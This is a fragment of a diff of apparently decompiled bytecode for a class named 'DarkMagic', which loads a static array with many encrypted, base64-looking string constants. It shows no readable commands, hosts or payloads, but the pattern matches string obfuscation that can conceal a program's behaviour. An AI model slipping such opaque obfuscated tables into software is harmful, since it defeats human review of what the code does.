+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(34), ldc:String("XfAmJrjLaqGs7/GOMWfHrP99tbsrenrXoNBl2405Ba8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(35), ldc:String("XfAmJrjLaqGs7/GOMWfHrCfAQrDDtVFNMlSoudl+G9k="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(36), ldc:String("E4k0TOh0fe+hhkHgSX2mVA=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(37), ldc:String("XfAmJrjLaqGs7/GOMWfHrPSiCnK3+55V"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(38), ldc:String("XfAmJrjLaqGs7/GOMWfHrDc5SRTc4bov5BD2nKFSEx8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(39), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE+Y9tjBy1TRg="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(40), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXNdRp+0qfVbs="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(41), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKaFWoRlBQdICRBBQhiUsvXw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(42), ldc:String("XfAmJrjLaqGs7/GOMWfHrJZTNyOWTMjciHS3zWZi2Ww="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(43), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEubPmWqPzoAQ="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(44), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuFm4n/CbKdlx"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(45), ldc:String("XfAmJrjLaqGs7/GOMWfHrBUk9KmqNGUG0E+nh0ZRzy8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(46), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuM52xLXsM5MS"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(47), ldc:String("ECjyvVhK3+9bdjKa9dSN/1vMqhUhcSL+/9wObTMCo/U="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(48), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuCdWtR/Bo+ad"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(49), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKADzT1wXVl+z7LLDARiV1Yg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(50), ldc:String("XfAmJrjLaqGs7/GOMWfHrBPMptQOjiac"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(51), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5Nax20uM3z3WUCmB5EBx6EF"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(52), ldc:String("P7pds31eJyAm9sl1JkN03wTCCar5pDgN"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(53), ldc:String("TfgetdCAef63x7XWx2/kqQ=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(54), ldc:String("ECjyvVhK3+9bdjKa9dSN/5mnJGri/i69"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(55), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUK/rOGBg2PaWB1mejfHXuFuQ=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(56), ldc:String("P7pds31eJyAm9sl1JkN039YR0WcDn2MH"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(57), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5PhP8iECimb+NwTIxz6RwHY"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(58), ldc:String("lIer0gGGWtg="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(59), ldc:String("XfAmJrjLaqGs7/GOMWfHrOKX0X9vnwyddHXE2t1/J2I="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(60), ldc:String("XfAmJrjLaqGs7/GOMWfHrNE7h/TKU+Ep"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(61), ldc:String("P7pds31eJyA1MCAg6ibp3RBXaoY24Rxv"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(62), ldc:String("ECjyvVhK3+9bdjKa9dSN//rHctiFDzTJTp2VpFpdmuQ="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(63), ldc:String("P7pds31eJyAm9sl1JkN030th0LG0WZc9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(64), ldc:String("0Ez0xGp13BQ6RMtXF5tAvgl4FON1qhCS"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(65), ldc:String("crxOp4cDMrHI4+3k0/0qZsJ2MUyQN6gk"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(66), ldc:String("6GQbuu7W/txn0BhOTRVLz4wTlJu6z/kpPx+YyGnugRc5Swqs0QPixKB6cK7gZDQ6kPpKU2Bw48KBMiXhouisj9XktoXo9jiS+ZpRdeYzVdhFTQaEYDPs45dEROu5mM8S6St6rRBWnoX6OuLf/jODqElYh0kIB6wK88HxtpR/tgz4BUrbreNJynwhmovdpidDvl1sZVWHhMI0JIjL3sticg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(67), ldc:String("9elNDU8Ob2j9LtvogfaD64LXlbzQg6RDsP0nsa6GzzPwem3csuvQY8IewmG9gkPlcVxio4fbmwZ9PKBdMNP4ayIK4Ejqt4f80lZYUJqumOo="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(68), ldc:String("/M5gOtbLZmABKE1Uv5lVjOIBqJ/lGYWAtLlYCisWbRH5JnDdnJpCPEq8ouJYJm57"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(69), ldc:String("xdTnvrgCmRNP3+c1K1+RL3JsuzVZ6Mwv"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(70), ldc:String("R484lsVNkYjRLCNoZf25AIGMEwvV+iHr"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(71), ldc:String("3M2WZB9yP+QftlVqdUP4xvcULyY0g33TiIsIrWP+eS8drJAughDEFiftx29AxKkV2xnRetIEitxS8IHIpPvUj3zKm6K+shXQ1T5LTuEyi/lyO9SsymU9xTf+dEautphtucVTXOsHmmhhJQdBeEARDtm9bHi+mbYzsFw6F2CoiIMkJVW7hYbm+dz2MSHaNxNMTuVcKKu+LEPX6DtkWtpSGg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(72), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKo4fR8scLLDNmwzagxXytcA=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(73), ldc:String("XfAmJrjLaqGs7/GOMWfHrGGAGxmcJVx9hrXNIePQi8o="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(74), ldc:String("P7pds31eJyDeGKRyvxD8avpplBVM7vu5"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(75), ldc:String("Y8W6KBDKe8swIT4YPxBo6XsuNRUd/gSB"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(76), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE2g4m76RgxpU="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(77), ldc:String("ECjyvVhK3+9bdjKa9dSN///FuA7PkzEw"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(78), ldc:String("ECjyvVhK3+9bdjKa9dSN/64W3njOTsF2"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(79), ldc:String("XfAmJrjLaqGs7/GOMWfHrJcFyEYzkSnD"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(80), ldc:String("ECjyvVhK3+9bdjKa9dSN/5mOtZppRGi/JMrZltfwxqw="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(81), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sESweiDmMNr6g="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(82), ldc:String("XfAmJrjLaqGs7/GOMWfHrNIQVh05B9h3/+N8UtGpeqs="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(83), ldc:String("XfAmJrjLaqGs7/GOMWfHrCaMZs2WYGgHWlK/imViH98="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(84), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEBrvySD/YJBQ="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(85), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPgayj/WsQ/O"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(86), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sENg4YOBRmTPI="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(87), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuLVkFnmLoHIA"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(88), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEzNquQUOr2wo="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(89), ldc:String("ECjyvVhK3+9bdjKa9dSN/xZSOSdEO8ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(90), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuIWdSV/1RkQW"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(91), ldc:String("XfAmJrjLaqGs7/GOMWfHrDC5ewxEpBns"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(92), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEA2nMBLtBzgw="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(93), ldc:String("XfAmJrjLaqGs7/GOMWfHrCvA5mqsGBbnA07FaWBKzb8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(94), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX4sSyL+VHzF8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(95), ldc:String("XfAmJrjLaqGs7/GOMWfHrNgnu+jX2SuraXtEBEmg5JI="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(96), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OunXsZY5A5KaU0FnT3vUfA"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(97), ldc:String("XfAmJrjLaqGs7/GOMWfHrH2K8xOs1kjCBGRtdhrBWgA="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(98), ldc:String("ECjyvVhK3+9bdjKa9dSN/4wMftwkCN14"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(99), ldc:String("XfAmJrjLaqGs7/GOMWfHrJ8RtR+cy6eZXFpPVpUtIEk="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(100), ldc:String("XfAmJrjLaqGs7/GOMWfHrCcBmYcxUYV8"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(101), ldc:String("XfAmJrjLaqGs7/GOMWfHrDTww4z1hdr3"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(102), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuI0YHAMyMeF5"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(103), ldc:String("XfAmJrjLaqGs7/GOMWfHrCL3lEZUJVJVpjlw1YIWR6M="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(104), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuDpnIGAvaFn4"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(105), ldc:String("ECjyvVhK3+9bdjKa9dSN/zpgP1+IlN9LQzI3JwR4yD8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(106), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuEg1ZMjXZZpW"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(107), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sESRmyxH3R1xE="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(108), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaQhXj1cHVG8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(109), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuBbQKEdMRHA3"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(110), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OrZNwvRWBFCW5580BY73V0"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(111), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX31hsw/CZ+JY="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(112), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEszBD7dIegWo="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(113), ldc:String("XfAmJrjLaqGs7/GOMWfHrO64eVvBD7FW2CCxzcxBmTg="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(114), ldc:String("XfAmJrjLaqGs7/GOMWfHrHtKCdMqaWMu"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(115), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKRkOF2bxRorPHaYmEMe4Puw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(116), ldc:String("M+wP1oJmbeTzpSkpuP8BPXgxvgKaeP0fk1mv99cvAl4NudtC171dl3vvm9y+6zk+EsURfTvrDEIECGx2AuEMGp9Mow4063Ip4up1G7aTSZd6uE/c66WvOfZs3E4pgT0y+v7qi6K2qd9j2Ntzn3ryETRTM2bNeQoDZ/SRBdgoEonsqfO8p3rKWL4rg0G0yoFoZRYAlrvN1zySDxmjMS0ej0usqgzDEd+WY7BQgQVpH+CGPoCPOIgW3w=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(117), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuH9JPjQj17Vu"))
+                    looporswitchbreak()
+                
+                case 2:
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(0), ldc:String("Eoiew7RN4aj1himMYwUBnGpewihveih1"))
+                    looporswitchbreak()
+                
+                case 4:
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(0), ldc:String("jh0VYxX5LEGQV0MTsylwDqZXxZZ9ht6o"))
+                    looporswitchbreak()
+            }
+            
+            inc:int(var_6_E3, ldc:int(1))
+        }
+    }
+}
